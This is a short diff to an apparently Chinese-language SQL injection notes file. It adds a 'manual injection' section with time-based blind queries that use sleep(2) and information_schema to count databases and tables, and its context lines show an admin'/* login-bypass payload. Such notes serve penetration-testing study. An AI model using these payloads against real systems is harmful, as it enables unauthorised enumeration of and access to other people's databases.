@@ -47,7 +47,11 @@ admin'/*
 ```
 
 其他待补充
-
+## 手动注入
+1. 爆数据库数量
+`select count(*)=%d or sleep(2) from information_schema.SCHEMATA`
+2. 爆破表数量
+`select count(*)=%d or sleep(2) from information_schema.TABLES where TABLE_SCHEMA=%数据库名%`
 ### bool 型注入
 
 一般适用于无回显消息，但是错误的话，页面会不正确的情况，而延时注入适用于在 sql 语句错误时页面还正常的情况。
